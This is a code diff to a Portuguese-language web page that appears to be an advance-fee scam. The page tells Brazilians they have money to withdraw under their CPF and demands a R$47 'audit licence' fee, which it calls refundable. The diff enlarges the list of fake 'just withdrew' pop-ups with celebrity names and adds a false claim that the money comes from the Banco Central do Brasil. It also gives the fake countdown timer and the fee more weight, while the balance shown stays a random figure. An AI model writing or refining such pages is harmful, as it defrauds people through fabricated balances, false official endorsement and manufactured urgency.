@@ -86,7 +86,8 @@
 
         .pix-container { background: #f9f9f9; border: 1px solid #ddd; border-radius: 12px; padding: 15px; margin-top: 15px; }
 
-        .footer { text-align: center; padding: 40px 20px; font-size: 11px; color: #999; border-top: 1px solid #ddd; line-height: 1.6; background: #f1f5f9; }
+        .footer { text-align: center; padding: 40px 20px; font-size: 12px; color: #1e293b; border-top: 2px solid var(--primary); line-height: 1.8; background: #e2e8f0; font-weight: 700; }
+        .footer b { color: var(--primary); }
     </style>
 </head>
 <body>
@@ -175,7 +176,7 @@
                     <div class="step-num">3</div>
                     <div class="step-info"><b>Saque Imediato</b><p style="color: #666;">Após a emissão da licença, o valor é transferido para sua chave PIX escolhida.</p></div>
                 </div>
-                <button class="btn-main" style="margin-top:20px;" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">🔍 CONSULTAR MEU SALDO AGORA</button>
+                <button class="btn-main" style="margin-top:20px;" onclick="document.getElementById('main-form').scrollIntoView({behavior: 'smooth'})">🔍 CONSULTAR MEU SALDO AGORA</button>
             </div>
         </div>
 
@@ -239,14 +240,15 @@
                 <div style="font-size: 15px; line-height: 1.6; color: #333; margin-bottom: 20px; text-align: center; background: #fffdf0; padding: 15px; border: 1px solid #ffeeba; border-radius: 12px;">
                     <span class="u-nome" style="font-weight: 800;"></span>, para garantir que o saque seja feito pelo titular do CPF e evitar fraudes, é necessário ativar sua <b>Licença de Auditoria Individual</b>.<br><br>
                     <b>IMPORTANTE:</b> O valor da licença de R$ 47,00 é <u>100% REEMBOLSÁVEL</u> e será devolvido automaticamente somado ao seu saque total de <b class="f-money-txt"></b>.
+                    <br><br><small style="font-weight:700; color:var(--primary)">*Os valores variam e são intercalados conforme o histórico de cada CPF.</small>
                 </div>
 
                 <div style="background: #fff; border: 2px solid var(--secondary); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 25px;">
                     <span style="font-size: 12px; color: #999; text-decoration: line-through;">De R$ 97,00</span>
-                    <div style="font-size: 38px; font-weight: 900; color: var(--secondary);">R$ 47,00</div>
+                    <div style="font-size: 42px; font-weight: 900; color: var(--secondary);">R$ 47,00</div>
                     <div style="display:flex; justify-content: space-around; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee;">
-                        <div><span style="display:block; font-size: 10px; color: #999;">Encerra em</span><b style="color:#ff0000" id="timer">05:00</b></div>
-                        <div><span style="display:block; font-size: 10px; color: #999;">Saque no CPF</span><b>DISPONÍVEL (1)</b></div>
+                        <div><span style="display:block; font-size: 12px; color: #999; font-weight:800;">Encerra em</span><b style="color:#ff0000; font-size: 18px;" id="timer">05:00</b></div>
+                        <div><span style="display:block; font-size: 12px; color: #999; font-weight:800;">Saque no CPF</span><b style="font-size: 18px;">DISPONÍVEL (1)</b></div>
                     </div>
                 </div>
 
@@ -261,8 +263,8 @@
         </div>
 
         <footer class="footer">
-            Sistema SARV TECNOLOGIA LTDA<br>
-            CNPJ: 42.184.291/0001-08<br><br>
+            <b>VALORES ENVIADOS PELO BANCO CENTRAL DO BRASIL</b><br>
+            Sistema SARV TECNOLOGIA LTDA | CNPJ: 42.184.291/0001-08<br>
             © 2026 Sistema SARV — Todos os direitos reservados.
         </footer>
     </div>
@@ -282,18 +284,36 @@
         });
 
         const usersPop = [
-            {n: "Ricardo M. dos Santos", c: "São Paulo"},
-            {n: "Maria Eduarda L. Ferreira", c: "Curitiba"},
-            {n: "José Silva Barbosa Filho", c: "Belo Horizonte"},
-            {n: "Luciana P. de Oliveira", c: "Rio de Janeiro"},
-            {n: "Marcos Oliveira da Silva", c: "Osasco"},
-            {n: "Fernanda G. Cavalcante", c: "Manaus"},
-            {n: "Sérgio Ramos da Costa", c: "Porto Alegre"}
+            {n: "Ricardo M. dos Santos", c: "São Paulo"}, {n: "Maria Eduarda L. Ferreira", c: "Curitiba"},
+            {n: "José Silva Barbosa Filho", c: "Belo Horizonte"}, {n: "Luciana P. de Oliveira", c: "Rio de Janeiro"},
+            {n: "Marcos Oliveira da Silva", c: "Osasco"}, {n: "Fernanda G. Cavalcante", c: "Manaus"},
+            {n: "Sérgio Ramos da Costa", c: "Porto Alegre"}, {n: "Adriana Lima", c: "Salvador"},
+            {n: "Bruno Gagliasso Rocha", c: "Campinas"}, {n: "Camila Pitanga Lima", c: "Santos"},
+            {n: "Daniela Mercury Santos", c: "Recife"}, {n: "Eduardo Costa Silva", c: "Brasília"},
+            {n: "Fábio Assunção Oliveira", c: "Belém"}, {n: "Giovanna Antonelli", c: "Florianópolis"},
+            {n: "Henrique Juliano", c: "Goiânia"}, {n: "Isabela Garcia", c: "Vitória"},
+            {n: "João Guilherme", c: "João Pessoa"}, {n: "Karina Bacchi", c: "Natal"},
+            {n: "Luan Santana", c: "Campo Grande"}, {n: "Maitê Proença", c: "Cuiabá"},
+            {n: "Neymar Jr Silva", c: "Santos"}, {n: "Otaviano Costa", c: "Ribeirão Preto"},
+            {n: "Paolla Oliveira", c: "Sorocaba"}, {n: "Quitéria Chagas", c: "Niterói"},
+            {n: "Rodrigo Faro", c: "Jundiaí"}, {n: "Sabrina Sato", c: "Penápolis"},
+            {n: "Tiago Leifert", c: "Barueri"}, {n: "Ulisses Costa", c: "Santo André"},
+            {n: "Vera Fischer", c: "Blumenau"}, {n: "Wagner Moura", c: "Salvador"},
+            {n: "Xuxa Meneghel", c: "Rio de Janeiro"}, {n: "Yasmim Brunet", c: "São Paulo"},
+            {n: "Zeca Pagodinho", c: "Duque de Caxias"}, {n: "Alice Wegmann", c: "Rio de Janeiro"},
+            {n: "Babu Santana", c: "Rio de Janeiro"}, {n: "Cauã Reymond", c: "Rio de Janeiro"},
+            {n: "Deborah Secco", c: "Rio de Janeiro"}, {n: "Emílio Dantas", c: "Rio de Janeiro"},
+            {n: "Flávia Alessandra", c: "Rio de Janeiro"}, {n: "Grazi Massafera", c: "Rio de Janeiro"},
+            {n: "Humberto Carrão", c: "Rio de Janeiro"}, {n: "Ísis Valverde", c: "Rio de Janeiro"},
+            {n: "Juliana Paes", c: "Rio de Janeiro"}, {n: "Klebber Toledo", c: "Rio de Janeiro"},
+            {n: "Leandra Leal", c: "Rio de Janeiro"}, {n: "Murilo Benício", c: "Rio de Janeiro"},
+            {n: "Nanda Costa", c: "Rio de Janeiro"}, {n: "Osmar Prado", c: "Rio de Janeiro"},
+            {n: "Patrícia Pillar", c: "Rio de Janeiro"}, {n: "Rainer Cadete", c: "Rio de Janeiro"}
         ];
         
         function showNotification() {
             const user = usersPop[Math.floor(Math.random() * usersPop.length)];
-            const val = (Math.random() * (3256 - 1100) + 1100).toLocaleString('pt-BR', {minimumFractionDigits: 2});
+            const val = (Math.random() * (3256 - 1100) + 1100).toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
             document.getElementById('notif-name').innerText = `${user.n} de ${user.c}`;
             document.getElementById('notif-val').innerText = `Acabou de sacar R$ ${val} via PIX`;
             const box = document.getElementById('notification-box');
@@ -343,9 +363,9 @@
         function showResult() {
             const min = 1100; const max = 3256;
             const total = Math.random() * (max - min) + min;
-            const sorteio = total.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
-            document.getElementById('val-tarifas').innerText = (total * 0.6).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
-            document.getElementById('val-juros').innerText = (total * 0.4).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+            const sorteio = total.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            document.getElementById('val-tarifas').innerText = (total * 0.6).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            document.getElementById('val-juros').innerText = (total * 0.4).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
             document.getElementById('f-money').innerText = "R$ " + sorteio;
             document.querySelectorAll('.f-money-txt').forEach(el => el.innerText = "R$ " + sorteio);
             document.getElementById('f-cpf').innerText = "CPF: " + document.getElementById('cpf').value;
